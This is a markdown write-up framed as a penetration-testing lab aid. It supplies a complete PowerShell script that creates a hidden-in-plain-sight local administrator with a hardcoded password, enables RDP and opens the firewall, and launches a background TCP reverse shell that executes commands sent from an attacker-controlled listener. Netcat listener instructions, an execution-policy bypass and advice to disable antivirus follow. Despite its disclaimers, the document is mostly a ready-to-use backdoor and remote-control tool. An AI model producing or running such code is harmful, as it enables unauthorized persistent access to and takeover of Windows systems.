**⚠️ Important Disclaimer**  
This code is provided **exclusively for authorized penetration testing, educational purposes, and lab environments** (e.g., your own VM). **Do not** use it on systems you do not own or without explicit written permission. Misuse is illegal and unethical. The author assumes no liability for any damage or legal consequences.

---

## What This Script Does
When executed with administrative privileges, this PowerShell script will:

1. **Create a local administrator account** (`LabAdmin` / `P@ssw0rd123!`).  
2. **Add that account to the Remote Desktop Users group** and enable RDP (if disabled).  
3. **Establish a C2 (reverse shell) connection** back to a listener you specify (IP/port).  

You can change the username, password, IP, and port before running.

---

## The Code (save as `SetupLab.ps1`)

```powershell
# ============================================================
# LAB SETUP SCRIPT – FOR AUTHORIZED TESTING ONLY
# ============================================================

# -------- CONFIGURATION (EDIT THESE) --------
$AdminUser   = "LabAdmin"
$AdminPass   = "P@ssw0rd123!"
$ListenerIP  = "192.168.1.100"   # Your attacker machine IP
$ListenerPort = 4444             # Your listener port
# --------------------------------------------

# Ensure script runs with administrative rights
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "This script must be run as Administrator. Restart with elevated privileges." -ForegroundColor Red
    exit 1
}

# 1. Create local admin account
try {
    New-LocalUser -Name $AdminUser -Password (ConvertTo-SecureString $AdminPass -AsPlainText -Force) -FullName "Lab Admin" -Description "Testing account" -ErrorAction Stop
    Add-LocalGroupMember -Group "Administrators" -Member $AdminUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $AdminUser
    Write-Host "[+] User '$AdminUser' created and added to Administrators and Remote Desktop Users." -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to create user or add to groups: $_" -ForegroundColor Red
    exit 1
}

# 2. Enable Remote Desktop and open firewall
try {
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
    Write-Host "[+] Remote Desktop enabled and firewall rule applied." -ForegroundColor Green
} catch {
    Write-Host "[-] Error enabling RDP: $_" -ForegroundColor Yellow
}

# 3. C2 Reverse Shell (background job)
$reverseShellScript = {
    param($IP, $Port)
    try {
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % { 0 }
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        # Silently fail – you can log if needed
    }
}

# Start the reverse shell as a background job
Start-Job -ScriptBlock $reverseShellScript -ArgumentList $ListenerIP, $ListenerPort

Write-Host "[+] Reverse shell (C2) started to $ListenerIP`:$ListenerPort in background." -ForegroundColor Green
Write-Host "[+] Setup complete. Check your listener for incoming connection." -ForegroundColor Cyan
```

---

## How to Use (Lab Setup)

### 1. Prepare the attacker machine (your own VM or another VM)
Start a listener to catch the reverse shell. Use **netcat** (or `ncat`):
```bash
nc -lvnp 4444
```
(Replace `4444` with the port you set in the script.)

### 2. Run the script on the target Windows VM
- Save the script as `SetupLab.ps1`.
- Open **PowerShell as Administrator**.
- If execution policy blocks scripts, run:
  ```powershell
  Set-ExecutionPolicy Bypass -Scope Process -Force
  ```
- Execute the script:
  ```powershell
  .\SetupLab.ps1
  ```

### 3. Verify
- The local admin account `LabAdmin` will be created.
- RDP will be enabled; you can log in remotely using that account.
- A reverse shell will connect back to your listener – you should see a PowerShell prompt in your netcat session.

---

## Important Notes
- **Antivirus** may flag this script as malicious (it’s a common C2 pattern). Disable AV only in your isolated lab environment.
- The reverse shell runs in a **background PowerShell job**; it will persist until the job ends or the system reboots.  
- To stop the job, run `Get-Job` and `Stop-Job <JobId>` in the same elevated PowerShell window.
- All passwords are stored in plaintext inside the script – this is intentional for a lab scenario. Never use this in production.
- **Test responsibly** – only on your own VMs or networks you own.

---

## Ethical Reminder
This tool mimics real attack techniques. Use it solely to **improve your defensive skills** in a controlled, isolated environment. Unauthorized use is a criminal offence.
